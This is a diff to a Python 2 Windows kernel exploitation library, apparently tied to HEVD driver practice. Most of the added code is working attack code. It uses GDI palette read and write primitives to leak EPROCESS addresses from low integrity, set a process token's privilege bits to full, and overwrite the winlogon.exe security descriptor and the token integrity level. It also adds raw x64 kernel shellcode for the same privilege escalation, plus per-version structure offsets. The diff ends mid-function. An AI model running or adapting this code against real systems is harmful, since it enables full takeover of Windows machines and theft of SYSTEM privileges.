@@ -367,6 +367,12 @@ def get_handles():
 		yield handle.UniqueProcessId, handle.HandleValue, handle.Object
 
 def token_address_of_process(h_process, process_id):
+	"""
+	Function to get the address of the token belonging to a process
+	@param h_process: handle to the process
+	@param process_id: PID of the same process
+	@return: address of the token
+	"""
 	token_handle = HANDLE()
 	if not advapi32.OpenProcessToken(h_process,TOKEN_ALL_ACCESS, byref(token_handle)):
 		print "[-] Could not open process token of process %s, exiting..." % pid
@@ -379,8 +385,26 @@ def token_address_of_process(h_process, process_id):
 				print "[+] PID: %s token address: %x" % (str(process_id), obj)
 				return obj
 
+def kernel_address_of_handle(h, process_id):
+	"""
+	Function to get the address of the handle
+	@param h: handle to the object
+	@param process_id: PID of the process
+	@return: address of the handle
+	"""
+	print "[*] Leaking handle addresses from kernel space..."
+	for pid, handle, obj in get_handles():
+		#print hex(handle)
+		if pid == process_id and handle == h:
+			print "[+] PID: %s handle %s address: %x" % (str(process_id), handle, obj)
+			return obj
+
 def getpid(procname):
-	""" Get Process Pid by procname """
+	"""
+	Get Process Pid by procname
+	@param procname: the name of the process to find
+	@return: PID
+	"""
 	pid = None
 	try:
 		hProcessSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
@@ -707,6 +731,7 @@ def create_palette_with_size(s):
 	lPalette = LOGPALETTE()
 	lPalette.palNumEntries = pal_cnt
 	lPalette.palVersion = 0x300
+	palette_handle = HANDLE()
 	palette_handle = gdi32.CreatePalette(byref(lPalette))
 	if palette_handle == None:
 		print '[-] Couldn\'t create palette, exiting...'
@@ -762,7 +787,7 @@ def get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS)
 	"""
 	if platform.architecture()[0] == '64bit':
 		#get OS EPROCESS structure constans values
-		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 		flink = c_ulonglong()
 		read_memory_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
 		current_pointer_EPROCESS = 0
@@ -785,18 +810,19 @@ def get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, pointer_EPROCESS)
 		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
 		sys.exit(-1)
 
-def get_current_eprocess_palette(manager_palette, worker_palette, pointer_EPROCESS):
+def find_eprocess_by_pid_palette(manager_palette, worker_palette, pointer_EPROCESS, search_pid):
 	"""
-	This function gets the kernel address of the current EPROCESS structure. It does it by going through the EPROCESS linked list.
+	This function gets the kernel address of the EPROCESS structure for the given PID. It does it by going through the EPROCESS linked list.
 	We need the palettes in order to read from memory.
 	@param manager_palette: handle to the manager palette
 	@param worker_palette: handle to the worker palette
-	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with (typically SYSTEM)
+	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with
+	@param search_pid: The PID of the process which EPROCESS we look for
 	@return: pointer to the current EPROCESS structure
 	"""
 	if platform.architecture()[0] == '64bit':
 		#get OS EPROCESS structure constans values
-		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 		flink = c_ulonglong()
 		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
 		current_pointer_EPROCESS = 0
@@ -807,7 +833,7 @@ def get_current_eprocess_palette(manager_palette, worker_palette, pointer_EPROCE
 			# Get PID; 
 			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
 			# Check if we're in the current process
-			if (os.getpid() == unique_process_id.value):
+			if (search_pid == unique_process_id.value):
 				current_pointer_EPROCESS = pointer_EPROCESS
 				break
 			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
@@ -815,6 +841,79 @@ def get_current_eprocess_palette(manager_palette, worker_palette, pointer_EPROCE
 			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
 				break		
 		return current_pointer_EPROCESS
+	else:
+		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
+		sys.exit(-1)
+
+def get_current_and_system_eprocess_palette(manager_palette, worker_palette):
+	"""
+	This function gets the kernel address of the current and SYSTEM EPROCESS structure
+	We need the palettes in order to read from memory.
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette
+	@return: tuple of the memeory addresses to the EPROCESS structures
+	"""
+	if platform.architecture()[0] == '64bit':
+		# Get SYSTEM EPROCESS
+		try:
+			print "[*] Trying with PsInitialSystemProcess"
+			#try first running this in case process runs in medium integrity mode
+			PsInitialSystemProcess = get_psinitialsystemprocess()
+			system_EPROCESS = c_ulonglong()
+			read_memory_palette(manager_palette, worker_palette, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
+			system_EPROCESS = system_EPROCESS.value	
+			print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
+			# Get current EPROCESS
+			current_EPROCESS = find_eprocess_by_pid_palette(manager_palette, worker_palette, system_EPROCESS, os.getpid())
+			print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
+		except Exception, e:
+			print "[-] Error: %s" % str(e)
+			print "[*] Process possibly runs in low integrity, trying to leak address with tagWND structures"
+			current_EPROCESS = leak_eprocess_address_palette(manager_palette, worker_palette)
+			print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
+			system_EPROCESS = find_eprocess_by_pid_palette(manager_palette, worker_palette, current_EPROCESS, 4)
+			print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
+		return (current_EPROCESS, system_EPROCESS)
+	else:
+		print "[-] Getting the current and SYSTEM EPROCESS strcuture function is not prepared to work on x86, exiting..."
+		sys.exit(-1)
+
+def find_pid_and_eprocess_by_name_palette(manager_palette, worker_palette, pointer_EPROCESS, search_name):
+	"""
+	This function gets the PID of a process with the given name. It does it by going through the EPROCESS linked list with the help of PALETTE objects.
+	We need the palettes in order to read from memory.
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette
+	@param pointer_EPROCESS: pointer to an EPROCESS structure to start with
+	@param search_name: The process we look for
+	@return: PID of the process and the EPROCESS address
+	"""
+	if platform.architecture()[0] == '64bit':
+		#get OS EPROCESS structure constans values
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
+		flink = c_ulonglong()
+		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
+		current_pointer_EPROCESS = 0
+		while (1):
+			unique_process_id = c_ulonglong(0)
+			image_file_name = c_uint(0) #we will read the first 4 bytes to this
+			# Adjust EPROCESS pointer for next entry; flink.value is pointing to the next Flink so we need to subtract that offset
+			pointer_EPROCESS = flink.value - EPROCESS_ActiveProcessLinks
+			# Get PID; 
+			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_UniqueProcessId, byref(unique_process_id), sizeof(unique_process_id));	
+			# Get Name; 
+			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ImageFileName, byref(image_file_name), sizeof(image_file_name));
+			current_name_4bytes = struct.pack("I",image_file_name.value).lower()
+			# Check if we're in the current process
+			if (current_name_4bytes == search_name[0:4]):
+				break
+			read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS + EPROCESS_ActiveProcessLinks, byref(flink), sizeof(flink));	
+			# If next same as last, we've reached the end
+			if (pointer_EPROCESS == flink.value - EPROCESS_ActiveProcessLinks):
+				break
+		print "[+] PID of %s is: %s" % (search_name, hex(unique_process_id.value))	
+		print "[+] EPROCESS structure of %s is at: %s" % (search_name, hex(pointer_EPROCESS))	
+		return (unique_process_id.value, pointer_EPROCESS)
 	else:
 		print "[-] Getting the current EPROCESS strcuture function is not prepared to work on x86, exiting..."
 		sys.exit(-1)
@@ -837,7 +936,7 @@ def tokenstealing_with_bitmaps(manager_bitmap, worker_bitmap):
 		current_EPROCESS = get_current_eprocess_bitmap(manager_bitmap, worker_bitmap, system_EPROCESS)
 		print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
 
-		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 		system_token = c_ulonglong()
 		print "[+] Reading System TOKEN"
 		read_memory_bitmap(manager_bitmap, worker_bitmap, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
@@ -846,7 +945,70 @@ def tokenstealing_with_bitmaps(manager_bitmap, worker_bitmap):
 	else:
 		print "[-]Token stealing with bitmaps function is not prepared to work on x86, exiting..."
 		sys.exit(-1)
-	
+
+def privilege_with_palettes(manager_palette, worker_palette):
+	"""
+	This function will give full privileges to the process, like described here: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-3
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette	
+	"""
+	print "[*] Giving full privileges to the process"
+	if platform.architecture()[0] == '64bit':
+		# Get SYSTEM EPROCESS
+		(current_EPROCESS, system_EPROCESS) = get_current_and_system_eprocess_palette(manager_palette, worker_palette)
+
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
+		token = c_ulonglong()
+		print "[+] Reading TOKEN address"
+		read_memory_palette(manager_palette, worker_palette, current_EPROCESS + EPROCESS_Token, byref(token), sizeof(token));
+		token_address = 0xFFFFFFFFFFFFFFF0 & token.value
+		print "[+] Giving full privileges"
+		full_priv = c_ulonglong(0xFFFFFFFFFFFFFFFF)
+		write_memory_palette(manager_palette, worker_palette, token_address + 0x40, byref(full_priv), sizeof(full_priv)); #Present bits, has to be set on newer Win10 versions
+		write_memory_palette(manager_palette, worker_palette, token_address + 0x48, byref(full_priv), sizeof(full_priv)); #Enabled bits
+	else:
+		print "[-]Giving full privileges to the process is not prepared to work on x86, exiting..."
+		sys.exit(-1)
+
+def acl_with_palettes(manager_palette, worker_palette, search_name):
+	"""
+	This function will give full privileges to the process, like described here: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette
+	@param search_name: the process to look for
+	"""
+	print "[*] Setting ACL on %s" % search_name
+	if platform.architecture()[0] == '64bit':
+		# Get SYSTEM EPROCESS
+		(current_EPROCESS, system_EPROCESS) = get_current_and_system_eprocess_palette(manager_palette, worker_palette)
+		
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
+		
+		(pid, pointer_EPROCESS) = find_pid_and_eprocess_by_name_palette(manager_palette, worker_palette, current_EPROCESS, search_name)
+		
+		#SecurityDescriptor is at -0x8 offset from EPROCESS, it's in the OBJECT_HEADER
+		SecurityDescriptor_pointer = c_ulonglong(0)
+		read_memory_palette(manager_palette, worker_palette, pointer_EPROCESS - 0x8, byref(SecurityDescriptor_pointer), sizeof(SecurityDescriptor_pointer));
+		SecurityDescriptor_address = SecurityDescriptor_pointer.value & 0xFFFFFFFFFFFFFFF0
+		print "[*] SecurityDescriptor_address is at %s " % hex(SecurityDescriptor_address)
+		DACL = c_ulonglong(0)
+		read_memory_palette(manager_palette, worker_palette, SecurityDescriptor_address + 0x48, byref(DACL), sizeof(DACL));
+		DACL_overwrite = c_ulonglong((DACL.value & 0xFFFFFFFFFFFFFF00) + 0xb)
+		write_memory_palette(manager_palette, worker_palette, SecurityDescriptor_address + 0x48, byref(DACL_overwrite), sizeof(DACL_overwrite));
+
+		token = c_ulonglong()
+		print "[+] Reading TOKEN address"
+		read_memory_palette(manager_palette, worker_palette, current_EPROCESS + EPROCESS_Token, byref(token), sizeof(token));
+		token_address = 0xFFFFFFFFFFFFFFF0 & token.value
+		integrity_level_settings = c_ulonglong(0)
+		read_memory_palette(manager_palette, worker_palette, token_address + TOKEN_IntegrityLevelIndex, byref(integrity_level_settings), sizeof(integrity_level_settings));
+		integrity_level_settings_overwrite = c_ulonglong(integrity_level_settings.value & 0xFFFFFF00FFFFFFFF)
+		write_memory_palette(manager_palette, worker_palette, token_address + TOKEN_IntegrityLevelIndex, byref(integrity_level_settings_overwrite), sizeof(integrity_level_settings_overwrite));
+
+	else:
+		print "[-]Setting ACL is not prepared to work on x86, exiting..."
+		sys.exit(-1)
+
 def tokenstealing_with_palettes(manager_palette, worker_palette):
 	"""
 	This function perform tokenstealing with the help of palettes
@@ -855,16 +1017,9 @@ def tokenstealing_with_palettes(manager_palette, worker_palette):
 	"""
 	if platform.architecture()[0] == '64bit':
 		# Get SYSTEM EPROCESS
-		PsInitialSystemProcess = get_psinitialsystemprocess()
-		system_EPROCESS = c_ulonglong()
-		read_memory_palette(manager_palette, worker_palette, PsInitialSystemProcess, byref(system_EPROCESS), sizeof(system_EPROCESS));	
-		system_EPROCESS = system_EPROCESS.value	
-		print "[+] SYSTEM EPROCESS: %s" % hex(system_EPROCESS)
-	
-		# Get current EPROCESS
-		current_EPROCESS = get_current_eprocess_palette(manager_palette, worker_palette, system_EPROCESS)
-		print "[+] Current EPROCESS: %s" % hex(current_EPROCESS)
-		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token) = getosvariablesx64()
+		(current_EPROCESS, system_EPROCESS) = get_current_and_system_eprocess_palette(manager_palette, worker_palette)
+
+		(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 		system_token = c_ulonglong()
 		print "[+] Reading System TOKEN"
 		read_memory_palette(manager_palette, worker_palette, system_EPROCESS + EPROCESS_Token, byref(system_token), sizeof(system_token));
@@ -1006,7 +1161,52 @@ def allocate_free_window(classNumber, pHMValidateHandle):
 	user32.UnregisterClassW(c_wchar_p("Class_" + str(classNumber)), hInst)
 		
 	return tagCLS_lpszMenuName
-		
+
+def leak_eprocess_address_palette(manager_palette, worker_palette):
+	"""
+	This function can be used to leak the current process EPROCESS structure address from low integrity mode, as described here:
+	https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-4-there-is-no-code
+	@param manager_palette: handle to the manager palette
+	@param worker_palette: handle to the worker palette
+	@return: address of the EPROCESS
+	"""
+	print "[*] Leaking EPROCESS using tagWND and PALETTE objects"
+	pHMValidateHandle = findHMValidateHandle()
+	HMValidateHandleProto = WINFUNCTYPE (c_ulonglong, HWND, c_int)
+	HMValidateHandle = HMValidateHandleProto(pHMValidateHandle)
+
+	WndProc = WNDPROCTYPE(PyWndProcedure)
+	hInst = kernel32.GetModuleHandleA(0)
+
+	# instantiate WNDCLASSEX 
+	wndClass = WNDCLASSEX()
+	wndClass.cbSize = sizeof(WNDCLASSEX)
+	wndClass.lpfnWndProc = WndProc
+	wndClass.cbWndExtra = 0
+	wndClass.hInstance = hInst
+	wndClass.lpszMenuName = 'A' * 0x8f0 
+	wndClass.lpszClassName = "Class_Leaker"
+
+	# Register Class and Create Window
+	hCls = user32.RegisterClassExW(byref(wndClass))
+	hWnd = user32.CreateWindowExA(0,"Class_Leaker",'Franco',0xcf0000,0,0,300,300,0,0,hInst,0)
+	pWnd = HMValidateHandle(hWnd,1)
+	kernelpSelf = (cast(pWnd+0x20, POINTER(c_ulonglong))).contents.value #tagWND in kernel
+
+	pThreadInfo = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, kernelpSelf + 0x10, byref(pThreadInfo), sizeof(pThreadInfo)); #tagWND + 0x10 is a pointer to THREADINFO structure
+	
+	pEthread = c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, pThreadInfo.value, byref(pEthread), sizeof(pEthread)); #offset 0x0 in THREADINFO pointer to ETHREAD
+
+	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
+	
+	eprocess =  c_ulonglong()
+	read_memory_palette(manager_palette, worker_palette, pEthread.value + KTHREAD_Process, byref(eprocess), sizeof(eprocess)); #offset to pointer to EPROCESS
+	print "[+] EPROCESS address leaked: %s" % hex(eprocess.value)
+	return eprocess.value
+
+
 #source: https://github.com/GradiusX/HEVD-Python-Solutions/blob/master/Win10%20x64%20v1703/HEVD_arbitraryoverwrite.py
 def alloc_free_windows(classNumber):
 	""" Calls alloc_free_window() until current address matches previous one """
@@ -1267,12 +1467,14 @@ def get_haldisp_offsets():
 def getosvariablesx86():
 	"""
 	Get various structure variables based on OS version
-	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
+	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex)
 	"""
 	KTHREAD_Process = 0
 	EPROCESS_ActiveProcessLinks = 0
 	EPROCESS_UniqueProcessId = 0
 	EPROCESS_Token = 0
+	EPROCESS_ImageFileName = 0
+	TOKEN_IntegrityLevelIndex = 0
 	version = sys.getwindowsversion()
 	p = platform.platform()
 
@@ -1315,24 +1517,26 @@ def getosvariablesx86():
 		EPROCESS_Token	= 0xF8
 		EPROCESS_UniqueProcessId	 = 0xB4
 		EPROCESS_ActiveProcessLinks  = 0xB8
-	
+
 	else:
 		print "[-] No matching OS version, exiting..."
 		sys.exit(-1)
 	
-	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
+	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex)
 
 def getosvariablesx64():
 	"""
 	Gets various structure variables based on OS version
 	# kd> dt nt!_EPROCESS uniqueprocessid token activeprocesslinks
 	# kd> dt nt!_KTHREAD ApcState; dt _KAPC_STATE process
-	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
+	@return: tuple of (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex)
 	"""
 	KTHREAD_Process = 0
 	EPROCESS_ActiveProcessLinks = 0
 	EPROCESS_UniqueProcessId = 0
 	EPROCESS_Token = 0
+	EPROCESS_ImageFileName = 0
+	TOKEN_IntegrityLevelIndex = 0
 	version = sys.getwindowsversion()
 	p = platform.platform()
 	if((version.major == 5) and (version.minor == 2)):
@@ -1348,49 +1552,63 @@ def getosvariablesx64():
 		EPROCESS_UniqueProcessId	 = 0x180
 		EPROCESS_ActiveProcessLinks  = 0x188
 		EPROCESS_Token	= 0x208
+		EPROCESS_ImageFileName = 0x2e0
+		TOKEN_IntegrityLevelIndex = 0xc8
 	elif p == 'Windows-8-6.2.9200-SP0':
 		print "[*] OS version: Windows 8x64"
 		KTHREAD_Process = 0xb8
 		EPROCESS_UniqueProcessId	 = 0x2e0
 		EPROCESS_ActiveProcessLinks  = 0x2e8
 		EPROCESS_Token	= 0x348
+		EPROCESS_ImageFileName = 0x438
+		TOKEN_IntegrityLevelIndex = 0xd0
 	elif p == 'Windows-8.1-6.3.9600':
 		print "[*] OS version: Windows 8.1x64"
 		KTHREAD_Process = 0xb8
 		EPROCESS_UniqueProcessId	 = 0x2e0
 		EPROCESS_ActiveProcessLinks  = 0x2e8
 		EPROCESS_Token	= 0x348
+		EPROCESS_ImageFileName = 0x438
+		TOKEN_IntegrityLevelIndex = 0xd0
 	elif p == 'Windows-10-10.0.10586':
 		print "[*] OS version: Windows 10x64 v1511 November Update"
 		KTHREAD_Process = 0xb8
 		EPROCESS_UniqueProcessId = 0x2e8
 		EPROCESS_ActiveProcessLinks = 0x2f0
 		EPROCESS_Token = 0x358
+		EPROCESS_ImageFileName = 0x450
+		TOKEN_IntegrityLevelIndex = 0xd0
 	elif p == 'Windows-10-10.0.14393':
 		print "[*] OS version: Windows 10x64 v1607 Anniversary Update"
 		KTHREAD_Process = 0xb8
 		EPROCESS_UniqueProcessId = 0x2e8
 		EPROCESS_ActiveProcessLinks = 0x2f0
 		EPROCESS_Token = 0x358
+		EPROCESS_ImageFileName = 0x450
+		TOKEN_IntegrityLevelIndex = 0xd0
 	elif p == 'Windows-10-10.0.15063':
 		print "[*] OS version: Windows 10x64 v1703 Creators Update"
 		KTHREAD_Process = 0xb8
 		EPROCESS_UniqueProcessId = 0x2e0
 		EPROCESS_ActiveProcessLinks = 0x2e8
 		EPROCESS_Token = 0x358
+		EPROCESS_ImageFileName = 0x450
+		TOKEN_IntegrityLevelIndex = 0xd0
 	elif p == 'Windows-10-10.0.16299':
 		print "[*] OS version: Windows 10x64 v1709 Creators Update"
 		KTHREAD_Process = 0xb8
 		EPROCESS_UniqueProcessId = 0x2e0
 		EPROCESS_ActiveProcessLinks = 0x2e8
-		EPROCESS_Token = 0x358	
+		EPROCESS_Token = 0x358
+		EPROCESS_ImageFileName = 0x450
+		TOKEN_IntegrityLevelIndex = 0xd0
 	else:
 		print "[-] No matching OS version, exiting..."
 		sys.exit(-1)
 		
-	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token)
+	return (KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex)
 
-def retore_hal_ptrs(HalDispatchTable,HaliQuerySystemInformation,HalpSetSystemInformation):
+def restore_hal_ptrs(HalDispatchTable,HaliQuerySystemInformation,HalpSetSystemInformation):
 	"""
 	Return a shellcode to retore HalDispatchTable ptrs
 	"""
@@ -1413,7 +1631,7 @@ def restoretokenx86(RETVAL, extra = ""):
 	@param RETVAL: the value for the ASM RET instruction
 	@return: token restore shellcode related to the platform
 	"""
-	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = getosvariablesx86()
+	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx86()
 	shellcode =  (
 	"\x52"
 	"\x33\xc0"														# xor	eax,eax
@@ -1439,7 +1657,7 @@ def tokenstealingx86(RETVAL, extra = ""):
 	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
 	@return: token stealing shellcode related to the platform
 	"""
-	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = getosvariablesx86()
+	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx86()
 	shellcode = (
 	"\x60"																			# pushad
 	"\x33\xc0"																		# xor	eax,eax
@@ -1471,7 +1689,7 @@ def tokenstealingx64(RETVAL, extra = ""):
 	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
 	@return: token stealing shellcode related to the platform
 	"""
-	(KTHREAD_Process,EPROCESS_ActiveProcessLinks,EPROCESS_UniqueProcessId,EPROCESS_Token) = getosvariablesx64()
+	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
 	shellcode = (
 	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]		 ;Get current ETHREAD in
 	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	 rax, [rax+0x68]		 ;Get current KTHREAD_Process address
@@ -1494,6 +1712,74 @@ def tokenstealingx64(RETVAL, extra = ""):
 	
 	return shellcode
 
+def acl_shellcode_x64(RETVAL, extra = "", name = "winlogon.exe"):
+	"""
+	#NOTTESTED
+	Create a shellcode for x64 platform to set the ACL for the given process name so that it will allow access for authenticated users
+	based on: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-2
+	@param RETVAL: the value for the ASM RET instruction
+	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
+	@param name: name of the process where to set the ACL
+	@return: token stealing shellcode related to the platform
+	"""
+	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
+	shellcode = (
+	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]	;Get current ETHREAD in
+	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) + 								# mov	 rax, [rax+0xb8]	;Get current KTHREAD_Process address
+	"\x48\x89\xc1"																		# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
+	"\x48\x8b\x80" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"			# mov	 rax, [rax+0xe0]		 ;Next KTHREAD_Process ActivKTHREAD_ProcessLinks.Flink
+	"\x48\x2d" + struct.pack("H",EPROCESS_ActiveProcessLinks) + "\x00\x00"				# sub	 rax, 0xe0			   ;Go to the beginning of the KTHREAD_Process structure
+	"\x81\xB8" + struct.pack("H",EPROCESS_ImageFileName) + "\x00\x00" + name[0:4][::-1] + # cmp dword ptr [rax+0x450], 0x6c6e6977
+	"\x75\xe7"																			# jnz short find_process   ;If no match got to next KTHREAD_Process
+	"\x48\x83\xE8\x08"																	# sub rax, 0x8 ; get to the SecurityDescriptor in the _OBJECT_HEADER
+	"\x48\x8B\x00" 																		# mov rax, qword ptr [rax]
+	"\x48\x83\xE0\xF0"																	# and rax, 0x0FFFFFFFFFFFFFFF0 ; clear last 4 bits
+	"\x48\x83\xC0\x48"																	# add rax, 0x48
+	"\xC6\x00\x0B"																		# mov byte ptr [rax], 0x0b
+	"\x48\x81\xC1" + struct.pack("H",EPROCESS_Token) + "\x00\x00"						# add rcx, 0x358  ; offset the Tokens
+	"\x48\x8B\x01"																		# mov rax, qword ptr [rcx] ; copy pointer
+	"\x48\x83\xE0\xF0"																	# and rax, 0x0FFFFFFFFFFFFFFF0 ; clear last 4 bits
+	"\x48\x05" + struct.pack("B",TOKEN_IntegrityLevelIndex + 4) + "\x00\x00\x00" 		# add rax, 0xd0+4 (0xd4)
+	"\xC6\x00\x00"																		# mov byte ptr [rax], 0
+	)
+	
+	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack
+	if RETVAL == "":
+		shellcode += "\xc3"						#retn
+	else:
+		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
+	
+	return shellcode
+
+def privilege_shellcode_x64(RETVAL, extra = ""):
+	"""
+	#NOTTESTED
+	Create a shellcode for x64 platform to give full privileges for the current process
+	based on: https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-3
+	@param RETVAL: the value for the ASM RET instruction
+	@param extra: extra shellcode to put after tokenstealing (e.g.: restore stack)
+	@return: token stealing shellcode related to the platform
+	"""
+	(KTHREAD_Process, EPROCESS_ActiveProcessLinks, EPROCESS_UniqueProcessId, EPROCESS_Token, EPROCESS_ImageFileName, TOKEN_IntegrityLevelIndex) = getosvariablesx64()
+	shellcode = (
+	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"												# mov	 rax, [gs:0x188]	;Get current ETHREAD in
+	"\x48\x8b\x40" + struct.pack("B",KTHREAD_Process) +									# mov	 rax, [rax+0xb8]	;Get current KTHREAD_Process address
+	"\x48\x89\xc1"																		# mov	 rcx, rax			;Copy current KTHREAD_Process address to RCX
+	"\x48\x81\xC1" + struct.pack("H",EPROCESS_Token) + "\x00\x00"						# add rcx, 0x358 ; offset the Tokens
+	"\x48\x8B\x01"																		# mov rax, qword ptr [rcx] ; copy pointer
+	"\x48\x83\xE0\xF0"																	# and rax, 0x0FFFFFFFFFFFFFFF0 ; clear last 4 bits
+	"\x48\xC7\x40\x48\xFF\xFF\xFF\xFF"													# mov qword ptr [rax+0x48], 0x0FFFFFFFFFFFFFFFF ; set the Enabled bits
+	"\x48\xC7\x40\x40\xFF\xFF\xFF\xFF"													# mov qword ptr [rax+0x40], 0x0FFFFFFFFFFFFFFFF ; set the Present bits
+	)
+	
+	shellcode += extra #append extra code after token stealing shellcode, e.g.: restore stack
+	if RETVAL == "":
+		shellcode += "\xc3"						#retn
+	else:
+		shellcode += "\xc2" + RETVAL + "\x00"	# ret	0x8	
+	
